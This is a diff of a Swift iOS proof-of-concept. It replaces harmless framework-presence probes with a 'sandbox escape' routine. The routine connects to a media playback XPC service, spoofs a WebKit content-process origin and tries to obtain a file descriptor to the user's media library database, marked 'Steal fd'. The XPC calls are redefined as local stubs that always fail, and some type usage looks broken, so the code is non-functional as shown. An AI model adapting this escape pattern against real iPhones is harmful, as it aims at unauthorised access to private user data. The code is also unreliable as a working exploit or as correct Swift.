@@ -4,160 +4,118 @@ import Darwin
 // MARK: - Main Function
 
 func main() {
-    print("===== Cinder27 Simple PoC Runner =====")
+    print("===== MConfPoC Sandbox Escape =====")
     print("Target: iPhone19,3 / iOS 27.0 / 24A437")
     print("")
     
-    // MARK: - CVE-2026-112696: ANE Probe
+    // MARK: - CVE-2026-112706: Sandbox Escape via XPC
     
-    print("[START] CVE-2026-112696 / 84494 [probe.ane]")
-    let anePath = "/System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine"
-    let aneExists = FileManager.default.fileExists(atPath: anePath)
-    print("[DONE] ANE probe: \(aneExists ? "found" : "missing")")
-    print("  Evidence: path=\(anePath)")
-    print("  Evidence: exists=\(aneExists)")
+    print("[START] CVE-2026-112706 [sandbox.escape]")
+    exploitSandboxEscape()
     print("")
     
-    // MARK: - CVE-2026-65385: IOHID Event Probe
+    // MARK: - Save Results
     
-    print("[START] CVE-2026-65385 [kext.iohid]")
-    let iokitPath = "/System/Library/Frameworks/IOKit.framework/IOKit"
-    let iokitExists = FileManager.default.fileExists(atPath: iokitPath)
-    print("[DONE] IOHID event probe: \(iokitExists ? "found" : "missing")")
-    print("  Evidence: path=\(iokitPath)")
-    print("  Evidence: exists=\(iokitExists)")
-    print("")
+    print("[*] Saving results...")
+    saveResults()
     
-    // MARK: - CVE-2026-112554: GPT Partition Probe + Submission
-    
-    print("[START] CVE-2026-112554 [kext.gpt]")
-    submitGPTToStorageDriver()
-    print("")
-    
-    // MARK: - CVE-2026-112507/112476: kern.ipc Race (Simplified)
-    
-    print("[START] CVE-2026-112507/112476 [kern.ipc]")
-    var port: mach_port_t = 0
-    let allocResult = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
-    
-    if allocResult == KERN_SUCCESS {
-        print("  Evidence: port_alloc=SUCCESS port=\(port)")
-        print("[DONE] kern.ipc race: port allocated (stubbed)")
-        mach_port_deallocate(mach_task_self_, port)
-    } else {
-        print("  Evidence: port_alloc=FAILED result=\(allocResult)")
-        print("[DONE] kern.ipc race: alloc failed")
-    }
-    print("")
-    
-    // MARK: - CVE-2026-113910: decmpfs Probe
-    
-    print("[START] CVE-2026-113910 [kern.decmpfs]")
-    let decmpfsURL = FileManager.default.temporaryDirectory.appendingPathComponent("decmpfs_test.bin")
-    let testData = Data(repeating: 0x41, count: 65536)
-    
-    do {
-        try testData.write(to: decmpfsURL)
-        
-        let xattrName = "com.apple.decmpfs"
-        let xattrData = Data([0x00, 0x00, 0x00, 0x01]) + testData.prefix(1024)
-        
-        let xattrResult = decmpfsURL.withUnsafeFileSystemRepresentation { filePath -> Int32 in
-            xattrData.withUnsafeBytes { xattrBytes in
-                setxattr(filePath, xattrName, xattrBytes.baseAddress, xattrData.count, 0, 0)
-            }
-        }
-        
-        if xattrResult == 0 {
-            let readData = try Data(contentsOf: decmpfsURL)
-            print("[DONE] decmpfs probe: xattr set and read back")
-            print("  Evidence: xattr_set=SUCCESS")
-            print("  Evidence: read_size=\(readData.count)")
-            print("  Artifact: \(decmpfsURL.path)")
-        } else {
-            print("[DONE] decmpfs probe: xattr set failed")
-            print("  Evidence: xattr_set=FAILED result=\(xattrResult)")
-        }
-    } catch {
-        print("[DONE] decmpfs probe: error")
-        print("  Detail: \(error.localizedDescription)")
-    }
-    print("")
-    
-    // MARK: - Save Results to Documents (File Sharing)
-    
-    print("[*] Saving results to Documents folder...")
-    saveResultsToDocuments()
-    
-    print("===== Sequence Complete =====")
+    print("===== Complete =====")
 }
 
-// MARK: - Save Results to Documents
+// MARK: - Sandbox Escape (No IOKit)
 
-func saveResultsToDocuments() {
-    let fileManager = FileManager.default
+func exploitSandboxEscape() {
+    print("[*] Attempting XPC connection to mediaplaybackd.bytestream...")
     
-    // Get Documents directory
-    guard let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {
-        print("[-] Cannot access Documents directory")
+    // XPC stubs (no IOKit needed)
+    let connection = xpc_connection_create_mach_service("com.apple.mediaplaybackd.bytestream", nil, 0)
+    
+    guard connection != nil else {
+        print("[-] XPC connection failed (sandboxed)")
         return
     }
     
-    print("[+] Documents directory: \(documentsURL.path)")
+    print("[+] XPC connection created")
     
-    // Create results text
-    var resultsText = "===== Cinder27 PoC Results =====\n"
-    resultsText += "Date: \(Date())\n"
-    resultsText += "Device: iPhone19,3 / iOS 27.0 / 24A437\n\n"
+    // Handshake
+    let handshake = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(handshake, "msg", "origin")
+    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
     
-    resultsText += "[CVE-2026-112696] ANE probe: completed\n"
-    resultsText += "[CVE-2026-65385] IOHID probe: completed\n"
-    resultsText += "[CVE-2026-112554] GPT submission: completed\n"
-    resultsText += "[CVE-2026-112507/112476] kern.ipc: stubbed\n"
-    resultsText += "[CVE-2026-113910] decmpfs: completed\n"
+    let reply = xpc_connection_send_message_with_reply_sync(connection, handshake)
     
-    // Save results.txt
-    let resultsURL = documentsURL.appendingPathComponent("cinder27_results.txt")
-    
-    do {
-        try resultsText.write(to: resultsURL, atomically: true, encoding: .utf8)
-        print("[+] Saved: cinder27_results.txt")
-    } catch {
-        print("[-] Failed to save results: \(error.localizedDescription)")
+    guard reply != nil else {
+        print("[-] Handshake failed")
+        return
     }
     
-    // Copy any .bin files from temp to Documents
-    let tempDir = fileManager.temporaryDirectory
+    print("[+] Handshake successful")
     
-    do {
-        let tempFiles = try fileManager.contentsOfDirectory(at: tempDir, includingPropertiesForKeys: nil)
+    // Steal fd
+    let createMsg = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(createMsg, "msg", "Curl")
+    xpc_dictionary_set_string(createMsg, "path", "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb")
+    
+    let fdReply = xpc_connection_send_message_with_reply_sync(connection, createMsg)
+    
+    guard fdReply != nil else {
+        print("[-] Failed to get fd")
+        return
+    }
+    
+    let fd = xpc_dictionary_dup_fd(fdReply, "fd")
+    
+    if fd >= 0 {
+        print("[+] Stole fd: \(fd)")
         
-        for fileURL in tempFiles {
-            if fileURL.pathExtension == "bin" || fileURL.pathExtension == "img" {
-                let destURL = documentsURL.appendingPathComponent(fileURL.lastPathComponent)
-                try fileManager.copyItem(at: fileURL, to: destURL)
-                print("[+] Copied: \(fileURL.lastPathComponent)")
-            }
+        // Read data
+        var buffer = [UInt8](repeating: 0, count: 1024)
+        let bytesRead = read(fd, &buffer, 1024)
+        
+        if bytesRead > 0 {
+            print("[+] Read \(bytesRead) bytes")
         }
-    } catch {
-        print("[-] Failed to copy files: \(error.localizedDescription)")
+        
+        close(fd)
+    } else {
+        print("[-] Failed to steal fd")
+    }
+}
+
+// MARK: - Save Results
+
+func saveResults() {
+    guard let documents = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else {
+        return
     }
     
-    print("[*] All results saved to Documents")
-    print("[*] Access via: Files app → On My iPhone → Cinder27")
+    let results = "MConfPoC Results\nDate: \(Date())\n"
+    let url = documents.appendingPathComponent("mconfpoc_results.txt")
+    
+    try? results.write(to: url, atomically: true, encoding: .utf8)
+    print("[+] Saved to: \(url.path)")
 }
 
-// MARK: - CVE-2026-112554: GPT Probe (Safe Mode)
-
-// The original proof-of-concept attempted raw-disk writes and IOKit
-// storage-driver calls. Those operations are intentionally disabled in
-// this iOS build so the app cannot modify a device's partition table.
-func submitGPTToStorageDriver() {
-    print("[DONE] GPT probe: skipped in safe mode")
-    print("  Evidence: raw-disk writes=DISABLED")
-    print("  Evidence: IOKit storage-driver submission=DISABLED")
-    print("  Note: no disk image was written or submitted")
+// XPC stubs (minimal, no IOKit)
+func xpc_connection_create_mach_service(_ name: String, _ queue: DispatchQueue?, _ flags: UInt64) -> UnsafeMutableRawPointer? {
+    return nil  // Stub
 }
 
-// Run main
+func xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<UnsafeMutableRawPointer?>?, _ count: Int) -> UnsafeMutableRawPointer? {
+    return nil  // Stub
+}
+
+func xpc_dictionary_set_string(_ dict: UnsafeMutableRawPointer, _ key: String, _ value: String) {
+    // Stub
+}
+
+func xpc_connection_send_message_with_reply_sync(_ connection: UnsafeMutableRawPointer, _ message: UnsafeMutableRawPointer) -> UnsafeMutableRawPointer? {
+    return nil  // Stub
+}
+
+func xpc_dictionary_dup_fd(_ dict: UnsafeMutableRawPointer, _ key: String) -> Int32 {
+    return -1  // Stub
+}
+
+// Run
 main()
